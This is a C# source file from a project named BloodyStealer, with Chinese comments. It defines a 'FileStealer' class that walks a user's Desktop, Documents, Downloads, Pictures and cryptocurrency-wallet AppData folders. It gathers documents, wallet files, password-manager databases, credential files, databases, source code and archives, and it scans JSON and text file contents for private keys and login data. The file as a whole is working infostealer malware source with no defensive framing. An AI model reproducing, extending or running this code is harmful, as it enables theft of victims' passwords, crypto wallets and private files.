using System;
using System.IO;
using System.Linq;
using System.Collections.Generic;
using System.Text.RegularExpressions;

namespace BloodyStealer.Stealers
{
    /// <summary>
    /// 文件窃取类，用于搜索和收集系统中的敏感文件
    /// </summary>
    internal class FileStealer
    {
        #region 数据结构

        /// <summary>
        /// 文件类别
        /// </summary>
        public enum FileCategory
        {
            Document,
            Image,
            Crypto,
            Password,
            Database,
            SourceCode,
            Archive
        }

        /// <summary>
        /// 收集到的文件信息
        /// </summary>
        public class FileInfo
        {
            public string FilePath { get; set; }
            public long FileSize { get; set; }
            public DateTime LastModified { get; set; }
            public FileCategory Category { get; set; }
            public string Extension { get; set; }
        }

        #endregion

        #region 属性和字段

        /// <summary>
        /// 收集到的文件列表
        /// </summary>
        public List<FileInfo> Files { get; private set; } = new List<FileInfo>();

        /// <summary>
        /// 搜索文件夹列表
        /// </summary>
        private readonly List<string> _searchFolders = new List<string>();

        /// <summary>
        /// 文件类别与扩展名映射
        /// </summary>
        private readonly Dictionary<FileCategory, string[]> _categoryExtensions = new Dictionary<FileCategory, string[]>();

        /// <summary>
        /// 文件大小限制（字节）
        /// </summary>
        private readonly long _maxFileSize;

        /// <summary>
        /// 每个类别最大文件数
        /// </summary>
        private readonly int _maxFilesPerCategory;

        /// <summary>
        /// 已收集的文件数（按类别）
        /// </summary>
        private readonly Dictionary<FileCategory, int> _collectedCounts = new Dictionary<FileCategory, int>();

        #endregion

        #region 构造函数

        /// <summary>
        /// 初始化文件窃取器
        /// </summary>
        /// <param name="maxFileSize">文件大小限制（字节）</param>
        /// <param name="maxFilesPerCategory">每个类别最大文件数</param>
        public FileStealer(long maxFileSize = 5 * 1024 * 1024, int maxFilesPerCategory = 10)
        {
            _maxFileSize = maxFileSize;
            _maxFilesPerCategory = maxFilesPerCategory;

            InitializeSearchFolders();
            InitializeCategoryExtensions();
            InitializeCounters();
        }

        /// <summary>
        /// 初始化搜索文件夹
        /// </summary>
        private void InitializeSearchFolders()
        {
            try
            {
                // 桌面文件夹
                string desktop = Environment.GetFolderPath(Environment.SpecialFolder.Desktop);
                _searchFolders.Add(desktop);

                // 文档文件夹
                string documents = Environment.GetFolderPath(Environment.SpecialFolder.MyDocuments);
                _searchFolders.Add(documents);

                // 下载文件夹
                string downloads = Path.Combine(Environment.GetFolderPath(Environment.SpecialFolder.UserProfile), "Downloads");
                if (Directory.Exists(downloads))
                {
                    _searchFolders.Add(downloads);
                }

                // 图片文件夹
                string pictures = Environment.GetFolderPath(Environment.SpecialFolder.MyPictures);
                _searchFolders.Add(pictures);

                // 本地应用数据文件夹（仅特定子文件夹）
                string appData = Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData);
                string[] appDataTargets = { "Bitcoin", "Ethereum", "Monero", "Litecoin", "Electrum", "Exodus", "Atomic" };
                foreach (string target in appDataTargets)
                {
                    string path = Path.Combine(appData, target);
                    if (Directory.Exists(path))
                    {
                        _searchFolders.Add(path);
                    }
                }
            }
            catch (Exception ex)
            {
                Console.WriteLine($"Error initializing search folders: {ex.Message}");
            }
        }

        /// <summary>
        /// 初始化文件类别与扩展名映射
        /// </summary>
        private void InitializeCategoryExtensions()
        {
            _categoryExtensions[FileCategory.Document] = new[]
            {
                ".doc", ".docx", ".xls", ".xlsx", ".ppt", ".pptx", ".pdf", ".txt", ".rtf", ".odt"
            };

            _categoryExtensions[FileCategory.Image] = new[]
            {
                ".jpg", ".jpeg", ".png", ".bmp", ".gif", ".tiff"
            };

            _categoryExtensions[FileCategory.Crypto] = new[]
            {
                ".wallet", ".dat", ".key", ".keys", ".keystore", ".json", ".seed", ".recovery"
            };

            _categoryExtensions[FileCategory.Password] = new[]
            {
                ".kdbx", ".kdb", ".pwm", ".psafe3", ".password", ".passwd", ".pwd", ".credentials"
            };

            _categoryExtensions[FileCategory.Database] = new[]
            {
                ".db", ".sqlite", ".sqlite3", ".mdb", ".accdb", ".sql"
            };

            _categoryExtensions[FileCategory.SourceCode] = new[]
            {
                ".cs", ".java", ".py", ".php", ".js", ".html", ".css", ".go", ".rb", ".swift"
            };

            _categoryExtensions[FileCategory.Archive] = new[]
            {
                ".zip", ".rar", ".7z", ".tar", ".gz", ".bz2"
            };
        }

        /// <summary>
        /// 初始化计数器
        /// </summary>
        private void InitializeCounters()
        {
            foreach (FileCategory category in Enum.GetValues(typeof(FileCategory)))
            {
                _collectedCounts[category] = 0;
            }
        }

        #endregion

        #region 公共方法

        /// <summary>
        /// 搜索并收集敏感文件
        /// </summary>
        public void StealFiles()
        {
            try
            {
                foreach (string folder in _searchFolders)
                {
                    try
                    {
                        if (Directory.Exists(folder))
                        {
                            SearchDirectory(folder);
                        }
                    }
                    catch (Exception ex)
                    {
                        Console.WriteLine($"Error searching directory {folder}: {ex.Message}");
                    }
                }
            }
            catch (Exception ex)
            {
                Console.WriteLine($"Error in StealFiles: {ex.Message}");
            }
        }

        /// <summary>
        /// 获取特定类别的文件
        /// </summary>
        /// <param name="category">文件类别</param>
        /// <returns>该类别的文件列表</returns>
        public List<FileInfo> GetFilesByCategory(FileCategory category)
        {
            return Files.Where(f => f.Category == category).ToList();
        }

        /// <summary>
        /// 获取收集到的统计信息
        /// </summary>
        /// <returns>统计信息字符串</returns>
        public string GetStatistics()
        {
            var stats = new Dictionary<FileCategory, int>();
            foreach (FileCategory category in Enum.GetValues(typeof(FileCategory)))
            {
                stats[category] = Files.Count(f => f.Category == category);
            }

            return string.Join("\n", stats.Select(pair => $"{pair.Key}: {pair.Value}"));
        }

        /// <summary>
        /// 添加自定义搜索文件夹
        /// </summary>
        /// <param name="folderPath">文件夹路径</param>
        public void AddSearchFolder(string folderPath)
        {
            if (Directory.Exists(folderPath) && !_searchFolders.Contains(folderPath))
            {
                _searchFolders.Add(folderPath);
            }
        }

        #endregion

        #region 私有方法

        /// <summary>
        /// 递归搜索目录
        /// </summary>
        /// <param name="directory">要搜索的目录</param>
        private void SearchDirectory(string directory)
        {
            try
            {
                // 忽略已达到限制的类别
                var categoriesToSearch = _categoryExtensions.Keys
                    .Where(cat => _collectedCounts[cat] < _maxFilesPerCategory)
                    .ToList();

                if (categoriesToSearch.Count == 0)
                {
                    return; // 所有类别都已达到限制
                }

                // 获取目录中的文件
                foreach (string file in Directory.GetFiles(directory))
                {
                    try
                    {
                        ProcessFile(file);
                    }
                    catch (Exception ex)
                    {
                        Console.WriteLine($"Error processing file {file}: {ex.Message}");
                    }
                }

                // 递归搜索子目录
                foreach (string subDir in Directory.GetDirectories(directory))
                {
                    try
                    {
                        // 检查是否需要继续搜索
                        bool shouldContinue = false;
                        foreach (FileCategory category in Enum.GetValues(typeof(FileCategory)))
                        {
                            if (_collectedCounts[category] < _maxFilesPerCategory)
                            {
                                shouldContinue = true;
                                break;
                            }
                        }

                        if (!shouldContinue)
                        {
                            break; // 所有类别都已达到限制
                        }

                        SearchDirectory(subDir);
                    }
                    catch (UnauthorizedAccessException)
                    {
                        // 忽略无权访问的目录
                    }
                    catch (Exception ex)
                    {
                        Console.WriteLine($"Error searching directory {subDir}: {ex.Message}");
                    }
                }
            }
            catch (Exception ex)
            {
                Console.WriteLine($"Error in SearchDirectory for {directory}: {ex.Message}");
            }
        }

        /// <summary>
        /// 处理单个文件
        /// </summary>
        /// <param name="filePath">文件路径</param>
        private void ProcessFile(string filePath)
        {
            try
            {
                string extension = Path.GetExtension(filePath).ToLower();
                
                // 查找文件类别
                FileCategory? category = null;
                foreach (var pair in _categoryExtensions)
                {
                    if (pair.Value.Contains(extension))
                    {
                        category = pair.Key;
                        break;
                    }
                }

                // 如果不是感兴趣的文件类型，则跳过
                if (category == null)
                {
                    return;
                }

                // 检查该类别是否已达到限制
                if (_collectedCounts[category.Value] >= _maxFilesPerCategory)
                {
                    return;
                }

                // 获取文件信息
                System.IO.FileInfo fileInfo = new System.IO.FileInfo(filePath);
                
                // 检查文件大小
                if (fileInfo.Length > _maxFileSize)
                {
                    return;
                }

                // 如果是加密货币相关文件，还需要检查内容
                if (category == FileCategory.Crypto)
                {
                    if (!IsCryptoWallet(filePath))
                    {
                        return;
                    }
                }

                // 如果是密码相关文件，也可以检查内容
                if (category == FileCategory.Password)
                {
                    if (!IsPasswordFile(filePath))
                    {
                        return;
                    }
                }

                // 添加到收集列表
                Files.Add(new FileInfo
                {
                    FilePath = filePath,
                    FileSize = fileInfo.Length,
                    LastModified = fileInfo.LastWriteTime,
                    Category = category.Value,
                    Extension = extension
                });

                // 更新计数器
                _collectedCounts[category.Value]++;
            }
            catch (Exception ex)
            {
                Console.WriteLine($"Error processing file {filePath}: {ex.Message}");
            }
        }

        /// <summary>
        /// 检查文件是否是加密货币钱包
        /// </summary>
        /// <param name="filePath">文件路径</param>
        /// <returns>是否是加密货币钱包</returns>
        private bool IsCryptoWallet(string filePath)
        {
            try
            {
                string fileName = Path.GetFileName(filePath).ToLower();
                string extension = Path.GetExtension(filePath).ToLower();
                string directory = Path.GetDirectoryName(filePath);

                // 检查文件名和目录名是否包含加密货币关键字
                string[] cryptoKeywords = { "wallet", "bitcoin", "btc", "ethereum", "eth", "monero", "xmr", "litecoin", "ltc", "ripple", "xrp", "dash", "doge", "crypto" };
                
                // 检查文件名
                foreach (string keyword in cryptoKeywords)
                {
                    if (fileName.Contains(keyword))
                    {
                        return true;
                    }
                }

                // 检查目录名
                if (directory != null)
                {
                    foreach (string keyword in cryptoKeywords)
                    {
                        if (directory.ToLower().Contains(keyword))
                        {
                            return true;
                        }
                    }
                }

                // 特殊文件检查
                if (fileName == "wallet.dat" || fileName == "electrum.dat" || fileName == "key.dat")
                {
                    return true;
                }

                // 如果是JSON文件，可以查找特定内容
                if (extension == ".json")
                {
                    string content = File.ReadAllText(filePath);
                    return content.Contains("private") && (content.Contains("address") || content.Contains("crypto") || content.Contains("key"));
                }

                return false;
            }
            catch
            {
                return false;
            }
        }

        /// <summary>
        /// 检查文件是否是密码文件
        /// </summary>
        /// <param name="filePath">文件路径</param>
        /// <returns>是否是密码文件</returns>
        private bool IsPasswordFile(string filePath)
        {
            try
            {
                string fileName = Path.GetFileName(filePath).ToLower();
                string extension = Path.GetExtension(filePath).ToLower();

                // 常见密码管理器文件扩展名
                if (extension == ".kdbx" || extension == ".kdb" || extension == ".psafe3")
                {
                    return true;
                }

                // 检查文件名是否包含密码相关关键字
                string[] passwordKeywords = { "password", "pwd", "login", "credential", "secret", "secure", "auth" };
                foreach (string keyword in passwordKeywords)
                {
                    if (fileName.Contains(keyword))
                    {
                        return true;
                    }
                }

                // 如果是文本文件，可以检查内容
                if (extension == ".txt" || extension == ".csv")
                {
                    string content = File.ReadAllText(filePath);
                    return content.Contains("password") || content.Contains("username") || content.Contains("login") || 
                           (content.Contains("@") && content.Contains(":"));
                }

                return false;
            }
            catch
            {
                return false;
            }
        }

        #endregion
    }
}